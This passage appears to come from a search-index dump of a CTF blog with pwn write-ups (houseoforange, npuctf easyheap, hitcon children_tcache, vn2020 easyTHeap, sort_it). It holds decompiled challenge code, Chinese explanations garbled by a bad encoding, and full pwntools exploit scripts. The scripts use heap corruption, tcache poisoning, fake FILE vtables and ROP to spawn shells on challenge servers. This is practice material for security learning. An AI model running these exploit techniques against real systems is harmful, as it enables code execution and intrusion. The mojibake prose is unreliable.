stdin);ï¼Œè¿™é‡Œå¤šè¯»äº†å‡ ä¸ªå­—èŠ‚ï¼Œæˆ‘ä»¬å¯ä»¥å°†gadgetæ”¾åœ¨è¿™é‡Œã€‚ç„¶åè®¡ç®—å‡ºæ ˆåˆ°ynçš„è·ç¦»ï¼Œä»å°†gadgetè½¬ç§»åˆ°æ ˆä¸Šã€‚ æœ€åæˆ‘ä»¬è¿˜éœ€è¦å¯¹æ•°ç»„è¿›è¡Œæ’åºæ‰èƒ½æ­£å¸¸çš„retï¼Œæ‰€ä»¥ä¸ºäº†æ–¹ä¾¿æˆ‘ä»¬é€šè¿‡åŒæ ·çš„æ‰‹æ®µå°†æ‰€æœ‰çš„å…ƒç´ éƒ½å˜æˆä¸€æ ·çš„ã€‚ ","date":"2021-04-18","objectID":"/challenges-100-week-8/:2:0","series":null,"tags":["Writeups"],"title":"Challenges 100 Week 8","uri":"/challenges-100-week-8/#ida-6"},{"categories":["Writeups"],"content":"exp from pwn import * from LibcSearcher import LibcSearcher from struct import pack leak = lambda name,addr: log.success('{0}addr ---\u003e {1}'.format(name, hex(addr))) context.log_level=\"DEBUG\" context.arch=\"amd64\" local=1 binary='./sort_it' #gdb.attach(sh) if local: sh=process(binary) else: sh=remote('challenge.nahamcon.com on port', 31286) elf = ELF(binary,checksec=False) #libc = ELF('./libc-2.271.so',checksec=False) sh.send('\\n') sh.sendlineafter('Enter the number for the word you want to select: ','1') sh.sendlineafter('Enter the number for the word you want to replace it with: ','14') leak_libc = u64(sh.recvuntil('\\x7f')[-6:].ljust(8,'\\x00')) libcbase = leak_libc - 0x020840 binsh=libcbase+0x18ce17 system = libcbase+0x0453a0 leak('libc base',libcbase) sh.sendlineafter('Are the words sorted? [y/n]: ','n') sh.sendlineafter('Enter the number for the word you want to select: ','1') sh.sendlineafter('Enter the number for the word you want to replace it with: ','13') leak_main = u64(sh.recvuntil('\\x55')[-6:].ljust(8,'\\x00')) textbase = leak_main- elf.sym['__libc_csu_init'] leak('text base',textbase) pop_rdi = textbase + 0x00001643 yn= textbase+0x4030 sh.sendlineafter('Are the words sorted? [y/n]: ','n') sh.sendlineafter('Enter the number for the word you want to select: ','1') sh.sendlineafter('Enter the number for the word you want to replace it with: ','11') stack = u64(sh.recvuntil('\\x7f')[-6:].ljust(8,'\\x00'))-(0xe40-0xd00) leak('leak_stack',stack) sh.sendlineafter('Are the words sorted? [y/n]: ','n'*8+p64(pop_rdi)) sh.sendlineafter('Enter the number for the word you want to select: ','1') sh.sendlineafter('Enter the number for the word you want to replace it with: ','11') sh.sendlineafter('Are the words sorted? [y/n]: ','n'*8+p64(pop_rdi)) sh.sendlineafter('Enter the number for the word you want to select: ','14') sh.sendlineafter('Enter the number for the word you want to replace it with: ',str((yn-stack)//8+2)) sh.sendlineafter('Are the words sorted? [y/n]: ','n'*8+p64(binsh)) sh.sendlineafter('Enter the number for the word you want to select: ','15') sh.sendlineafter('Enter the number for the word you want to replace it with: ',str((yn-stack)//8+2)) #gdb.attach(sh) sh.sendlineafter('Are the words sorted? [y/n]: ','n'*8+p64(system)) sh.sendlineafter('Enter the number for the word you want to select: ','16') sh.sendlineafter('Enter the number for the word you want to replace it with: ',str((yn-stack)//8+2)) for i in range(1,10): sh.sendlineafter('Are the words sorted? [y/n]: ','n'*8+'a'*8) sh.sendlineafter('Enter the number for the word you want to select: ',str(i)) sh.sendlineafter('Enter the number for the word you want to replace it with: ',str((yn-stack)//8+2)) sh.sendlineafter('Are the words sorted? [y/n]: ','y') sh.interactive() ","date":"2021-04-18","objectID":"/challenges-100-week-8/:3:0","series":null,"tags":["Writeups"],"title":"Challenges 100 Week 8","uri":"/challenges-100-week-8/#exp-6"},{"categories":["Writeups"],"content":"Challenges_100-Week_7 Challenges Tricks BUU-houseoforange_hitcon_2016 house_of_orange BUU-npuctf2020-easyheap off-by-one+ovlapping chunk BUU-hitcon2018_children_tcache off-by-null+tcache_psisoning BUU-vn2020-easyTHeap tcache_psisoning+hacking tcache struct BUU-vn2020-simpleheap off-by-one+ovlapping chunk+house_of_spirit BUU-vn2020-warmup orw BUU-hitcontraining-stkof unlink ","date":"2021-04-18","objectID":"/challenges-100-week-7/:0:0","series":null,"tags":["Writeups"],"title":"Challenges 100 Week 7","uri":"/challenges-100-week-7/#challenges_100-week_7"},{"categories":["Writeups"],"content":"BUU-houseoforange_hitcon_2016","date":"2021-04-18","objectID":"/challenges-100-week-7/:0:0","series":null,"tags":["Writeups"],"title":"Challenges 100 Week 7","uri":"/challenges-100-week-7/#buu-houseoforange_hitcon_2016"},{"categories":["Writeups"],"content":"checksec Arch: amd64-64-little RELRO: Full RELRO Stack: Canary found NX: NX enabled PIE: PIE enabled FORTIFY: Enabled ","date":"2021-04-18","objectID":"/challenges-100-week-7/:1:0","series":null,"tags":["Writeups"],"title":"Challenges 100 Week 7","uri":"/challenges-100-week-7/#checksec"},{"categories":["Writeups"],"content":"IDAadd int add() { unsigned int size; // [rsp+8h] [rbp-18h] int size_4; // [rsp+Ch] [rbp-14h] _QWORD *v3; // [rsp+10h] [rbp-10h] _DWORD *v4; // [rsp+18h] [rbp-8h] if ( add_count \u003e 3u ) { puts(\"Too many house\"); exit(1); } v3 = malloc(0x10uLL); printf(\"Length of name :\"); size = read_num(); if ( size \u003e 0x1000 ) size = 0x1000; v3[1] = malloc(size); if ( !v3[1] ) { puts(\"Malloc error !!!\"); exit(1); } printf(\"Name :\"); read_data(v3[1], size); v4 = calloc(1uLL, 8uLL); printf(\"Price of Orange:\"); *v4 = read_num(); color_list(); printf(\"Color of Orange:\"); size_4 = read_num(); if ( size_4 != 56746 \u0026\u0026 (size_4 \u003c= 0 || size_4 \u003e 7) ) { puts(\"No such color\"); exit(1); } if ( size_4 == 56746 ) v4[1] = 56746; else v4[1] = size_4 + 30; *v3 = v4; color = v3; ++add_count; return puts(\"Finish\"); } up int up() { _DWORD *v1; // rbx unsigned int v2; // [rsp+8h] [rbp-18h] int v3; // [rsp+Ch] [rbp-14h] if ( up_counter \u003e 2u ) return puts(\"You can't upgrade more\"); if ( !color ) return puts(\"No such house !\"); printf(\"Length of name :\"); v2 = read_num(); if ( v2 \u003e 0x1000 ) v2 = 4096; printf(\"Name:\"); read_data(color[1], v2); printf(\"Price of Orange: \"); v1 = (_DWORD *)*color; *v1 = read_num(); color_list(); printf(\"Color of Orange: \"); v3 = read_num(); if ( v3 != 56746 \u0026\u0026 (v3 \u003c= 0 || v3 \u003e 7) ) { puts(\"No such color\"); exit(1); } if ( v3 == 56746 ) *(_DWORD *)(*color + 4LL) = 56746; else *(_DWORD *)(*color + 4LL) = v3 + 30; ++up_counter; return puts(\"Finish\"); } see int see() { int v0; // eax int result; // eax int v2; // eax if ( !color ) return puts(\"No such house !\"); if ( *(_DWORD *)(*color + 4LL) == 56746 ) { printf(\"Name of house : %s\\n\", (const char *)color[1]); printf(\"Price of orange : %d\\n\", *(unsigned int *)*color); v0 = rand(); result = printf(\"\\x1B[01;38;5;214m%s\\x1B[0m\\n\", *((const char **)\u0026unk_203080 + v0 % 8)); } else { if ( *(int *)(*color + 4LL) \u003c= 30 || *(int *)(*color + 4LL) \u003e 37 ) { puts(\"Color corruption!\"); exit(1); } printf(\"Name of house : %s\\n\", (const char *)color[1]); printf(\"Price of orange : %d\\n\", *(unsigned int *)*color); v2 = rand(); result = printf(\"\\x1B[%dm%s\\x1B[0m\\n\", *(unsigned int *)(*color + 4LL), *((const char **)\u0026unk_203080 + v2 % 8)); } return result; } æ¼æ´ç‚¹ä¸ºï¼šåœ¨upä¸­æœ‰æº¢å‡ºã€‚ å¦‚é¢˜ï¼Œä½¿ç”¨house_of_orangeï¼Œæœ¬è´¨ä¸Šhouse_of_orangeä¸­ä½¿ç”¨äº†unsortedbin attackå°†ä¼ªé€ çš„fake FILEé“¾å…¥_IO_list_allä¸­ï¼Œå®ç°æ§åˆ¶ç¨‹åºæ‰§è¡Œæµã€‚ ","date":"2021-04-18","objectID":"/challenges-100-week-7/:2:0","series":null,"tags":["Writeups"],"title":"Challenges 100 Week 7","uri":"/challenges-100-week-7/#ida"},{"categories":["Writeups"],"content":"exp from pwn import * from LibcSearcher import LibcSearcher from struct import pack leak = lambda name,addr: log.success('{0}addr ---\u003e {1}'.format(name, hex(addr))) context.arch=\"amd64\" local=0 binary='./houseoforange_hitcon_2016' #gdb.attach(sh) if local: #context.log_level=\"DEBUG\" sh=process(binary) else: sh=remote('node3.buuoj.cn',27919) elf = ELF(binary,checksec=False) #libc = ELF('./libc-2.27.so',checksec=False) vtable_offset=0xd8 _IO_write_base=0x20 _IO_write_ptr=0x28 def add(length, name, price, color): sh.recvuntil('choice : ') sh.sendline('1') sh.sendlineafter('Length of name :', str(length)) sh.sendafter('Name :', str(name)) sh.sendafter('Price of Orange:', str(price)) sh.sendafter('Color of Orange:', str(color)) def see(): sh.recvuntil('choice : ') sh.sendline('2') def up(length, name, price, color): sh.recvuntil('choice : ') sh.sendline('3') sh.sendlineafter('Length of name :', str(length)) sh.sendafter('Name:', str(name)) sh.sendafter('Price of Orange:', str(price)) sh.sendafter('Color of Orange:', str(color)) #get a free chunk add(0x80,'a'*8,111,0xddaa) up(0x450,'\\x00'*0x80+p64(0)+p64(0x21)+'\\x00'*0x10+p64(0)+p64(0xf31),222,0xddaa) add(0x1000,'c'*8,333,0xddaa) add(0x400,'a'*8,444,0xddaa) #fake vtable #gdb.attach(sh) see() main_arena=u64(sh.recvuntil('\\x7f')[-6:].ljust(8,'\\x00')) malloc_hook = main_arena-1640-0x10 libc = LibcSearcher('__malloc_hook',malloc_hook) libcbase = malloc_hook-libc.dump('__malloc_hook') leak('main hook',malloc_hook) leak('libc base',libcbase) IO_list_all = libcbase +libc.dump('_IO_list_all') system=libcbase+libc.dump('system') leak('IO_list_all',IO_list_all) up(0x400,'a'*0x10,666,0xddaa) see() heapbase = u64(sh.recvuntil('\\x56')[-6:].ljust(8,'\\x00')) leak('heap base',heapbase) vtable=heapbase+0x400+0x20+0x100-0x10 payload = '\\x00'*0x408+p64(0x21)+'\\x00'*0x10 payload+='/bin/sh\\x00'+p64(0x61) payload+=p64(main_arena)+p64(IO_list_all-0x10) payload+=p64(0x2)+p64(0x3)+p64(0)*21 payload+=p64(vtable)+p64(0)*3+p64(system) up(0x1000,payload,666,0xddaa) #get shell #gdb.attach(sh) sh.recvuntil('choice : ') sh.sendline('1') sh.interactive() offset 0x0 _flags 0x8 _IO_read_ptr 0x10 _IO_read_end 0x18 _IO_read_base 0x20 _IO_write_base 0x28 _IO_write_ptr 0x30 _IO_write_end 0x38 _IO_buf_base 0x40 _IO_buf_end 0x48 _IO_save_base 0x50 _IO_backup_base 0x58 _IO_save_end 0x60 _markers 0x68 _chain 0x70 _fileno 0x74 _flags2 0x78 _old_offset 0x80 _cur_column 0x82 _vtable_offset 0x83 _shortbuf 0x88 _lock 0x90 _offset 0x98 _codecvt 0xa0 _wide_data 0xa8 _freeres_list 0xb0 _freeres_buf 0xb8 __pad5 0xc0 _mode 0xc4 _unused2 0xd8 vtable void * funcs[] = { 1 NULL, // \"extra word\" 2 NULL, // DUMMY 3 exit, // finish 4 NULL, // overflow 5 NULL, // underflow 6 NULL, // uflow 7 NULL, // pbackfail 8 NULL, // xsputn #printf 9 NULL, // xsgetn 10 NULL, // seekoff 11 NULL, // seekpos 12 NULL, // setbuf 13 NULL, // sync 14 NULL, // doallocate 15 NULL, // read 16 NULL, // write 17 NULL, // seek 18 pwn, // close 19 NULL, // stat 20 NULL, // showmanyc 21 NULL, // imbue }; ","date":"2021-04-18","objectID":"/challenges-100-week-7/:3:0","series":null,"tags":["Writeups"],"title":"Challenges 100 Week 7","uri":"/challenges-100-week-7/#exp"},{"categories":["Writeups"],"content":"BUU-npuctf2020-easyheap","date":"2021-04-18","objectID":"/challenges-100-week-7/:0:0","series":null,"tags":["Writeups"],"title":"Challenges 100 Week 7","uri":"/challenges-100-week-7/#buu-npuctf2020-easyheap"},{"categories":["Writeups"],"content":"checksec Arch: amd64-64-little RELRO: Partial RELRO Stack: Canary found NX: NX enabled PIE: No PIE (0x400000) ","date":"2021-04-18","objectID":"/challenges-100-week-7/:1:0","series":null,"tags":["Writeups"],"title":"Challenges 100 Week 7","uri":"/challenges-100-week-7/#checksec-1"},{"categories":["Writeups"],"content":"IDAcreate unsigned __int64 create() { __int64 v0; // rbx int i; // [rsp+4h] [rbp-2Ch] size_t size; // [rsp+8h] [rbp-28h] char buf[8]; // [rsp+10h] [rbp-20h] BYREF unsigned __int64 v5; // [rsp+18h] [rbp-18h] v5 = __readfsqword(0x28u); for ( i = 0; i \u003c= 9; ++i ) { if ( !*((_QWORD *)\u0026heaparray + i) ) { *((_QWORD *)\u0026heaparray + i) = malloc(0x10uLL); if ( !*((_QWORD *)\u0026heaparray + i) ) { puts(\"Allocate Error\"); exit(1); } printf(\"Size of Heap(0x10 or 0x20 only) : \"); read(0, buf, 8uLL); size = atoi(buf); if ( size != 24 \u0026\u0026 size != 56 ) exit(-1); v0 = *((_QWORD *)\u0026heaparray + i); *(_QWORD *)(v0 + 8) = malloc(size); if ( !*(_QWORD *)(*((_QWORD *)\u0026heaparray + i) + 8LL) ) { puts(\"Allocate Error\"); exit(2); } **((_QWORD **)\u0026heaparray + i) = size; printf(\"Content:\"); read_input(*(_QWORD *)(*((_QWORD *)\u0026heaparray + i) + 8LL), size); puts(\"Done!\"); return __readfsqword(0x28u) ^ v5; } } return __readfsqword(0x28u) ^ v5; } edit unsigned __int64 edit() { int v1; // [rsp+0h] [rbp-10h] char buf[4]; // [rsp+4h] [rbp-Ch] BYREF unsigned __int64 v3; // [rsp+8h] [rbp-8h] v3 = __readfsqword(0x28u); printf(\"Index :\"); read(0, buf, 4uLL); v1 = atoi(buf); if ( v1 \u003c 0 || v1 \u003e 9 ) { puts(\"Out of bound!\"); _exit(0); } if ( *((_QWORD *)\u0026heaparray + v1) ) { printf(\"Content: \"); read_input(*(_QWORD *)(*((_QWORD *)\u0026heaparray + v1) + 8LL), **((_QWORD **)\u0026heaparray + v1) + 1LL); puts(\"Done!\"); } else { puts(\"How Dare you!\"); } return __readfsqword(0x28u) ^ v3; } show unsigned __int64 show() { int v1; // [rsp+0h] [rbp-10h] char buf[4]; // [rsp+4h] [rbp-Ch] BYREF unsigned __int64 v3; // [rsp+8h] [rbp-8h] v3 = __readfsqword(0x28u); printf(\"Index :\"); read(0, buf, 4uLL); v1 = atoi(buf); if ( v1 \u003c 0 || v1 \u003e 9 ) { puts(\"Out of bound!\"); _exit(0); } if ( *((_QWORD *)\u0026heaparray + v1) ) { printf( \"Size : %ld\\nContent : %s\\n\", **((_QWORD **)\u0026heaparray + v1), *(const char **)(*((_QWORD *)\u0026heaparray + v1) + 8LL)); puts(\"Done!\"); } else { puts(\"How Dare you!\"); } return __readfsqword(0x28u) ^ v3; } dele unsigned __int64 delete() { int v1; // [rsp+0h] [rbp-10h] char buf[4]; // [rsp+4h] [rbp-Ch] BYREF unsigned __int64 v3; // [rsp+8h] [rbp-8h] v3 = __readfsqword(0x28u); printf(\"Index :\"); read(0, buf, 4uLL); v1 = atoi(buf); if ( v1 \u003c 0 || v1 \u003e 9 ) { puts(\"Out of bound!\"); _exit(0); } if ( *((_QWORD *)\u0026heaparray + v1) ) { free(*(void **)(*((_QWORD *)\u0026heaparray + v1) + 8LL)); free(*((void **)\u0026heaparray + v1)); *((_QWORD *)\u0026heaparray + v1) = 0LL; puts(\"Done !\"); } else { puts(\"How Dare you!\"); } return __readfsqword(0x28u) ^ v3; } åˆ©ç”¨editä¸­çš„off-by-oneé€ æˆchunk overlappingä¿®æ”¹æŒ‡é’ˆï¼Œä»è€Œæ”¹å†™gotè¡¨ã€‚ ","date":"2021-04-18","objectID":"/challenges-100-week-7/:2:0","series":null,"tags":["Writeups"],"title":"Challenges 100 Week 7","uri":"/challenges-100-week-7/#ida-1"},{"categories":["Writeups"],"content":"exp from pwn import * from struct import pack leak = lambda name,addr: log.success('{0}addr ---\u003e {1}'.format(name, hex(addr))) context.arch=\"amd64\" local=0 binary='./npuctf_2020_easyheap' #gdb.attach(sh) if local: context.log_level=\"DEBUG\" sh=process(binary) else: sh=remote('node3.buuoj.cn',29293) elf = ELF(binary,checksec=False) libc = ELF('./libc-2.27.so',checksec=False) one=[0x4f2c5,0x4f322,0x10a38c] puts_got = elf.got['puts'] free_got = elf.got['free'] def add(size, content): sh.recvuntil(' :') sh.sendline('1') sh.sendlineafter(') : ', str(size)) sh.sendafter('Content:', str(content)) def edit(idx, content): sh.recvuntil(' :') sh.sendline('2') sh.sendlineafter('ndex :', str(idx)) sh.sendafter('Content:', str(content)) def show(idx): sh.recvuntil(' :') sh.sendline('3') sh.sendlineafter('ndex :', str(idx)) def free(idx): sh.recvuntil(' :') sh.sendline('4') sh.sendlineafter('ndex :', str(idx)) add(0x18,'1'*8) #0 add(0x18,'2'*8) #1 add(0x18,'/bin/sh\\x00') #2 edit(0, '\\x00'*0x18+'\\x41') free(1) add(0x38,'4'*8*3+p64(0x21)+p64(0x38)+p64(free_got)) #1 #gdb.attach(sh) show(1) free_addr=u64(sh.recvuntil('\\x7f')[-6:].ljust(8,'\\x00')) leak('free',free_addr) libcbase = free_addr-libc.sym['free'] free_hook = libcbase+libc.sym['__free_hook'] system = libcbase+libc.sym['system'] leak('libc base',libcbase) one_gadget = libcbase+one[2] edit(1,p64(system)) free(2) sh.interactive() ","date":"2021-04-18","objectID":"/challenges-100-week-7/:3:0","series":null,"tags":["Writeups"],"title":"Challenges 100 Week 7","uri":"/challenges-100-week-7/#exp-1"},{"categories":["Writeups"],"content":"BUU-hitcon2018_children_tcache","date":"2021-04-18","objectID":"/challenges-100-week-7/:0:0","series":null,"tags":["Writeups"],"title":"Challenges 100 Week 7","uri":"/challenges-100-week-7/#buu-hitcon2018_children_tcache"},{"categories":["Writeups"],"content":"checksec Arch: amd64-64-little RELRO: Full RELRO Stack: Canary found NX: NX enabled PIE: PIE enabled FORTIFY: Enabled ","date":"2021-04-18","objectID":"/challenges-100-week-7/:1:0","series":null,"tags":["Writeups"],"title":"Challenges 100 Week 7","uri":"/challenges-100-week-7/#checksec-2"},{"categories":["Writeups"],"content":"IDAadd unsigned __int64 add() { int i; // [rsp+Ch] [rbp-2034h] char *dest; // [rsp+10h] [rbp-2030h] unsigned __int64 size; // [rsp+18h] [rbp-2028h] char s[8216]; // [rsp+20h] [rbp-2020h] BYREF unsigned __int64 v5; // [rsp+2038h] [rbp-8h] v5 = __readfsqword(0x28u); memset(s, 0, 0x2010uLL); for ( i = 0; ; ++i ) { if ( i \u003e 9 ) { puts(\":(\"); return __readfsqword(0x28u) ^ v5; } if ( !heap_array[i] ) break; } printf(\"Size:\"); size = sub_B67(); if ( size \u003e 0x2000 ) exit(-2); dest = (char *)malloc(size); if ( !dest ) exit(-1); printf(\"Data:\"); sub_BC8(s, (unsigned int)size); strcpy(dest, s); // off-by-null heap_array[i] = dest; size_array[i] = size; return __readfsqword(0x28u) ^ v5; } show int show() { __int64 v0; // rax unsigned __int64 v2; // [rsp+8h] [rbp-8h] printf(\"Index:\"); v2 = sub_B67(); if ( v2 \u003e 9 ) exit(-3); v0 = heap_array[v2]; if ( v0 ) LODWORD(v0) = puts((const char *)heap_array[v2]); return v0; } dele int dele() { unsigned __int64 v1; // [rsp+8h] [rbp-8h] printf(\"Index:\"); v1 = sub_B67(); if ( v1 \u003e 9 ) exit(-3); if ( heap_array[v1] ) { memset((void *)heap_array[v1], 218, size_array[v1]); free((void *)heap_array[v1]); heap_array[v1] = 0LL; size_array[v1] = 0LL; } return puts(\":)\"); } æ¼æ´æ˜¯off-by-nullï¼Œè€Œè¿œç¨‹çš„libcè¿˜æ²¡æœ‰tcacheçš„double freeçš„æ£€æŸ¥ã€‚é€šè¿‡off-by-oneï¼Œæˆ‘ä»¬èƒ½åšåˆ°æ¸…ç©ºä¸‹ä¸€ä¸ªchunkçš„prev_inuseä½ï¼Œè¿™ç‚¹å¯ä»¥å¯¼è‡´overlappingã€‚ é¦–å…ˆï¼Œç”³è¯·ä¸‰ä¸ªchunkã€‚chunk_0å’Œchunk_2è¦æ˜¯large binï¼Œè¿™æ ·å°±ä¸ä¼šè¿›å…¥tcacheä¸­ï¼Œæˆ‘ä»¬é€šè¿‡chunk_1ï¼Œæ¸…é™¤chunk_2çš„prev_inuseä½ï¼Œå¹¶å°†prev_sizeåŸŸè®¾ä¸ºchunk_0+chunk_1çš„å¤§å°ï¼Œè®©chunk_2è®¤ä¸ºå‰é¢æœ‰ä¸€å—å·¨å¤§çš„æ›´å¤§çš„chunkã€‚åœ¨åšè¿™ä¸€æ­¥ä¹‹å‰ï¼Œè¦é¦–å…ˆå°†chunk_0 freeæ‰ï¼Œä¸ç„¶åœ¨åç»­çš„freeä¸­ä¼šå‡ºç°sizeä¸prev_sizeçš„ä¸åŒ¹é…ï¼Œå¯¼è‡´ç¨‹åºé€€å‡ºã€‚ ä¹‹åfreeæ‰chunk_2ï¼Œæ­¤æ—¶è¿™ä¸‰ä¸ªchunkè¢«åˆå¹¶åŠ å…¥äº†unsorted binä¸­ï¼Œç„¶åï¼Œç”³è¯·å’Œæœ€å¼€å§‹chunk_0åŒæ ·å¤§å°çš„chunkï¼Œunsorted binä¸­çš„chunkè¢«åˆ†å‰²ï¼ŒåŸæœ¬çš„chunk_1+chunk_2è¢«åŠ å…¥unsorted binã€‚æ³¨æ„ï¼Œè¿™æ—¶chunk_1è¿˜åœ¨è¢«æˆ‘ä»¬ä½¿ç”¨ä¸­ï¼Œæ‰€ä»¥å¯ä»¥é€šè¿‡showæ¥leak libcã€‚ æ¥ç€ï¼Œæƒ³åŠæ³•æ§åˆ¶ç¨‹åºæ‰§è¡Œæµã€‚å†æ¬¡ï¼Œå°†chunk_1ç”³è¯·å›æ¥ï¼Œè¿™æ ·æˆ‘ä»¬å°±æœ‰ä¸¤ä¸ªchunkï¼ŒæŒ‡å‘chunk_1ï¼Œä½¿ç”¨tcache_psisoningè·å¾—__malloc_hooké™„è¿‘çš„chunkï¼Œå¡«å…¥one_gadgetï¼Œä»è€Œget shellã€‚ ","date":"2021-04-18","objectID":"/challenges-100-week-7/:2:0","series":null,"tags":["Writeups"],"title":"Challenges 100 Week 7","uri":"/challenges-100-week-7/#ida-2"},{"categories":["Writeups"],"content":"exp from pwn import * from LibcSearcher import LibcSearcher from struct import pack leak = lambda name,addr: log.success('{0}addr ---\u003e {1}'.format(name, hex(addr))) context.arch=\"amd64\" local=0 binary='./HITCON_2018_children_tcache' #gdb.attach(sh) if local: context.log_level=\"DEBUG\" sh=process(binary) else: sh=remote('node3.buuoj.cn',25968) elf = ELF(binary,checksec=False) #libc = ELF('./libc-2.27.so',checksec=False) heap_array=0x202060 free_got = elf.got['free'] def add(size, content): sh.recvuntil('choice: ') sh.sendline('1') sh.sendlineafter('Size:', str(size)) sh.sendlineafter('Data:', str(content)) def show(idx): sh.recvuntil('choice: ') sh.sendline('2') sh.sendlineafter('Index:', str(idx)) def free(idx): sh.recvuntil('choice: ') sh.sendline('3') sh.sendlineafter('Index:', str(idx)) add(0x4f8,'a') #0 0x500 add(0x78,'b') #1 0x80 add(0x4f8,'c') #2 0x500 add(0x18,'/bin/sh\\x00') #3 free(1) free(0) #clear chunk_3's prev_inuse bit for i in range(0,8): add((0x78-i),'a'*(0x78-i)) #0 0x80 free(0) add(0x78,'b'*0x70+p64(0x580)) #0 0x80 free(2) add(0x4f8,'c'*0x4f7) #1 #gdb.attach(sh) show(0) main_arena = u64(sh.recvuntil('\\x7f').ljust(8,'\\x00'))-96 malloc_hook = main_arena-0x10 libc=LibcSearcher('__malloc_hook',malloc_hook) libcbase=malloc_hook-libc.dump('__malloc_hook') one_gadget = libcbase + 0x4f322 leak('libcbase',libcbase) add(0x78,'a') #2 free(0) free(2) add(0x78,p64(malloc_hook)) #0 add(0x78,p64(malloc_hook)) #2 add(0x78,p64(one_gadget)) #4 sh.recvuntil('choice: ') sh.sendline('1') sh.sendlineafter('Size:', str(12)) sh.interactive() æ³¨æ„strcpyæœ¬èº«ä¼šè¢«â€™\\x00â€™æˆªæ–­ï¼Œæ‰€ä»¥é€šè¿‡å¾ªç¯off-by-nullçš„æ–¹å¼ä¿®æ”¹prev_sizeã€‚ ","date":"2021-04-18","objectID":"/challenges-100-week-7/:3:0","series":null,"tags":["Writeups"],"title":"Challenges 100 Week 7","uri":"/challenges-100-week-7/#exp-2"},{"categories":["Writeups"],"content":"BUU-vn2020-easyTHeap","date":"2021-04-18","objectID":"/challenges-100-week-7/:0:0","series":null,"tags":["Writeups"],"title":"Challenges 100 Week 7","uri":"/challenges-100-week-7/#buu-vn2020-easytheap"},{"categories":["Writeups"],"content":"checksec Arch: amd64-64-little RELRO: Full RELRO Stack: Canary found NX: NX enabled PIE: PIE enabled ","date":"2021-04-18","objectID":"/challenges-100-week-7/:1:0","series":null,"tags":["Writeups"],"title":"Challenges 100 Week 7","uri":"/challenges-100-week-7/#checksec-3"},{"categories":["Writeups"],"content":"IDAmain void __fastcall main(__int64 a1, char **a2, char **a3) { sub_A39(a1, a2, a3); puts(\"Welcome to V\u0026N challange!\"); puts(\"This's a tcache heap for you.\"); while ( 1 ) { sub_DCF(); switch ( (unsigned int)sub_9EA() ) { case 1u: if ( !add_count )//7 exit(0); add(); --add_count; break; case 2u: edit(); break; case 3u: show(); break; case 4u: if ( !free_count )//3 { puts(\"NoNoNo!\"); exit(0); } free_(); --free_count; break; case 5u: exit(0); default: puts(\"Please input current choice.\"); break; } } } add int add() { int result; // eax int v1; // [rsp+8h] [rbp-8h] int v2; // [rsp+Ch] [rbp-4h] v1 = sub_AB2(); if ( v1 == -1 ) return puts(\"Full\"); printf(\"size?\"); result = sub_9EA(); v2 = result; if ( result \u003e 0 \u0026\u0026 result \u003c= 256 ) { qword_202080[v1] = malloc(result); if ( !qword_202080[v1] ) { puts(\"Something Wrong!\"); exit(-1); } dword_202060[v1] = v2; result = puts(\"Done!\"); } return result; } show int sub_CA4() { int v1; // [rsp+Ch] [rbp-4h] printf(\"idx?\"); v1 = sub_9EA(); if ( v1 \u003c 0 || v1 \u003e 6 || !*((_QWORD *)\u0026qword_202080 + v1) ) exit(0); puts(*((const char **)\u0026qword_202080 + v1)); return puts(\"Done!\"); } edit int edit() { int v1; // [rsp+Ch] [rbp-4h] printf(\"idx?\"); v1 = sub_9EA(); if ( v1 \u003c 0 || v1 \u003e 6 || !qword_202080[v1] ) exit(0); printf(\"content:\"); read(0, (void *)qword_202080[v1], (unsigned int)dword_202060[v1]); return puts(\"Done!\"); } dele int free_() { int v1; // [rsp+Ch] [rbp-4h] printf(\"idx?\"); v1 = sub_9EA(); if ( v1 \u003c 0 || v1 \u003e 6 || !qword_202080[v1] ) exit(0); free((void *)qword_202080[v1]); dword_202060[v1] = 0; return puts(\"Done!\"); } ä¸¥æ ¼é™åˆ¶äº†addæ¬¡æ•°ä¸º7æ¬¡ï¼Œfreeæ¬¡æ•°ä¸º3æ¬¡ã€‚ä½†æ˜¯æ²¡æœ‰é”€æ¯æŒ‡é’ˆï¼Œåªæ˜¯ä¿®æ”¹äº†sizeä¸º0ã€‚ åœ¨è¿œç¨‹çš„ç¯å¢ƒä¸­ï¼Œä¸ºglibc-2.27ï¼Œtcacheæ²¡æœ‰å¯¹double freeçš„æ£€æµ‹ï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥é€šè¿‡double freeæ³„éœ²å †çš„åŸºå€ã€‚tcache structå°±åœ¨å †çš„æœ€å¼€å§‹ï¼Œé€šè¿‡è®¡ç®—åç§»ï¼Œä¿®æ”¹tcacheä¸­chunkçš„fdæŒ‡é’ˆï¼Œå°†è¿™å—å†…å­˜ç”³è¯·å‡ºæ¥ï¼Œç„¶åä¿®æ”¹å…¶countçš„æ•°é‡ï¼Œä»è€Œé˜²æ­¢ä¹‹åfreeçš„chunkè¿›å…¥tcacheã€‚å†å°†è¿™å—å†…å­˜è¿›è¡Œfreeï¼Œå®ƒä¼šè¿›å…¥unsorted binä¸­ä»è€Œleak libcã€‚ è¿™æ—¶å†è¿›è¡Œç”³è¯·ï¼Œç³»ç»Ÿä¼šå°†tcache structè¿›è¡Œåˆ†å‰²ï¼Œè¿”å›ç»™æˆ‘ä»¬ï¼Œæˆ‘ä»¬å†ä¿®æ”¹å…¶nextæŒ‡é’ˆï¼ŒæŒ‡å‘malloc_hooké™„è¿‘çš„fake chunkä»è€Œè¦†å†™get shellã€‚ ","date":"2021-04-18","objectID":"/challenges-100-week-7/:2:0","series":null,"tags":["Writeups"],"title":"Challenges 100 Week 7","uri":"/challenges-100-week-7/#ida-3"},{"categories":["Writeups"],"content":"exp from pwn import * from LibcSearcher import LibcSearcher from struct import pack leak = lambda name,addr: log.success('{0}addr ---\u003e {1}'.format(name, hex(addr))) #context.log_level=\"DEBUG\" #context.arch=\"amd64\" local=0 binary='./vn_pwn_easyTHeap' if local: sh=process(binary) else: sh=remote('node3.buuoj.cn',26965) elf = ELF(binary,checksec=False) libc = ELF('./libc-2.27.so',checksec=False) #gdb.attach(sh) def add(size): sh.sendlineafter(': ','1') sh.sendlineafter('?',str(size)) def edit(idx,content): sh.sendlineafter(': ','2') sh.sendlineafter('?',str(idx)) sh.sendafter('content:',str(content)) def show(idx): sh.sendlineafter(': ','3') sh.sendlineafter('?',str(idx)) def free(idx): sh.sendlineafter(': ','4') sh.sendlineafter('?',str(idx)) one = [0x4f2c5,0x4f322,0x10a38c] add(0x50) #0 free(0) free(0) #gdb.attach(sh) show(0) heap_base = u64(sh.recvuntil('\\n', drop = True).ljust(8, '\\x00'))-0x250 leak('heap base',heap_base) add(0x50) #1 